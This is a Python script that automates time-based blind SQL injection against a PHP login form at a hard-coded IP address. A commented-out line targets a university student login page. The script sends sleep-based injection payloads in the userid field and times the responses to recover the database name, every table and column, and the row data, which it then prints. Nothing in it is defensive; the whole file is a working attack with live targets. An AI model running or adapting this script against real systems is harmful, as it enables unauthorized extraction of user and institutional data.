import time
import requests

url = 'http://104.197.42.200/member/login_ok.php'
#url = 'https://stud.inje.ac.kr/AuthUser.aspx'
cookies = {'PHPSESSID':'d42rp6qqm5fhj3dmn3830g74pq'}
keyword = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

def find_db_length():
	db_len = 0
	while 1:
		db_len += 1
		value = "' or 1=1 and length(database())={} and sleep(2)#".format(db_len) 
		params = {'userid': value, 'userpw': 'test'}
	#	params = {'__VIEWSTATE' :'%2FwEPDwUJODQzOTQyNTc1D2QWAgIDD2QWBgIBDw9kFgoeB29uZm9jdXMFJnJldHVybiBsb2dpbmJveDEodGhpcywgJ2luJywgJ3Bhc3NJRCcpHgZvbmJsdXIFJ3JldHVybiBsb2dpbmJveDIodGhpcywgJ291dCcsICdwYXNzSUQnKR4Kb25rZXlwcmVzcwUYcmV0dXJuIEtleVByZXNzVXNlcklEKCk7Hgtvbm1vdXNlb3ZlcgW0AXRpcF9pdF9sb2dpbigxLCfstZzstIgg7ZWZ67KI7J20IOy0iOq4sCDsgqzsmqnsnpDslYTsnbTrlJQg7J6F64uI64ukJywn7JiIKSDrjIDtlZksIOuMgO2VmeybkCDrqqjrkZAg7ZWZ7KCB7J20IOyeiOuKlCDqsr3smrAg64yA7ZWZIO2VmeuyiOydtCDstIjquLAg7IKs7Jqp7J6Q7JWE7J2065SUIOyeheuLiOuLpCcpOx4Kb25tb3VzZW91dAUXdGlwX2l0X2xvZ2luKDAsICcnLCAnJylkAgUPD2QWBB8ABSZyZXR1cm4gbG9naW5ib3gxKHRoaXMsICdpbicsICdwYXNzUFcnKR8BBSdyZXR1cm4gbG9naW5ib3gyKHRoaXMsICdvdXQnLCAncGFzc1BXJylkAgcPFgIeA3NyYwU6L0NvbW1vbi9JbWFnZXMvTWFpbkltYWdlcy9zcHJpbmcvTG9naW5fVmlzdWFsaW1nYWVf67SELmpwZ2QYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFCWlidG5Mb2dpbm8Xg5F85T53WBeZ6pNiXp0fqIcl', '__VIEWSTATEGENERATOR' :'CA0B0334', '__EVENTVALIDATION' : '%2FwEWBAK8t8LXDQKcgonWCgKBo5SvBQKJo5q5DaCoDbMAKgJiLkKyCoYDX9bgjZeV', 'ibtnLogin.x' :'16', 'ibtnLogin.y' :'26', 'IjisUserID': value, 'IjisPassword': 'test'}
		start = time.time()
		response = requests.post(url,data=params, cookies=cookies)
	#	print(response.content)
		print(value)
		if time.time() - start > 2: 
			break
	return db_len 

def find_db_name(length):
	result = ''
	for i in range(length):
		for key in keyword:
			value = "' or 1=1 and binary(substring(database(),{},1))= '{}' and sleep(2)#".format(i + 1, key)
			params = {'userid': value, 'userpw': 'test'}
			start = time.time()
			response = requests.post(url,data=params, cookies=cookies)
			#print(response.content)
			print(value)
			if time.time() - start > 2:
				result += key
				break
	return result

def find_table_name(db_name):
	result = ''
	list = []
	size = 0
	i = 1
	while 1:
		for key in keyword:
			value = "' or 1=1 and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='{}' limit {},1),{},1)='{}' and sleep(2)#".format(db_name, size, i, key)
			params = {'userid': value, 'userpw': 'test'}
			start = time.time()
			response = requests.post(url,data=params, cookies=cookies)
			#print(response.content)
			print(value)
			if time.time() - start > 2:
				result += key
				i += 1
				break
			if(i == 1 and key == '0'):
				return list
			if key == '0':
				list.append(result)
				result = ''
				i = 1
				size += 1
	return list

def find_column_name(table_name):
	result = ''
	list = []
	size = 0
	i = 1
	while 1:
		for key in keyword:
			value = "' or 1=1 and substring((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1)='{}' and sleep(2)#".format(table_name, size, i, key)
			params = {'userid': value, 'userpw': 'test'}
			start = time.time()
			response = requests.post(url,data=params, cookies=cookies)
			#print(response.content)
			print(value)
			if time.time() - start > 2:
				result += key
				i += 1
				break
			if(i == 1 and key == '0'):
				return list
			if key == '0':
				list.append(result)
				result = ''
				i = 1
				size += 1
	return list

def find_data(table_name, column_name):
	result = ''
	list = []
	size = 0
	i = 1
	while 1:
		for key in keyword:
			value = "' or 1=1 and substring((select {} from {} limit {},1),{},1)='{}' and sleep(2)#".format(column_name, table_name, size, i, key)
			params = {'userid': value, 'userpw': 'test'}
			start = time.time()
			response = requests.post(url,data=params, cookies=cookies)
			#print(response.content)
			print(value)
			if time.time() - start > 2:
				result += key
				i += 1
				break
			if(i == 1 and key == '0'):
				return list
			if key == '0':
				list.append(result)
				result = ''
				i = 1
				size += 1
	return list

if __name__ == '__main__':
	db_length = find_db_length()
	print("DB length = "+ str(db_length))
	db_name = find_db_name(db_length)
	print("DB NAME = "+ db_name)
	table_name = find_table_name(db_name)
	for i in table_name:
		print(i)
	column_name = {}
	for table in table_name:
		column_name[table] = find_column_name(table)
	for item in column_name.items():
		print(item)
	data = {}
	for table in table_name:
		for key in column_name[table]:
			data[key] = find_data(table, key)
	
	print("============================")
	print("DB length = "+ str(db_length))
	print("DB NAME = "+ db_name)
	print("TABLE NAME ================ ")
	for i in table_name:
		print(i)
	print("COLUMN NAME =============== ")
	for item in column_name.items():
		print(item)
	print("data ======================")
	for table in table_name:
		print(table + "테이블의 데이터")
		for column in column_name[table]:
			print(column + ": ", end="")
			print(data[column])
	print("============================")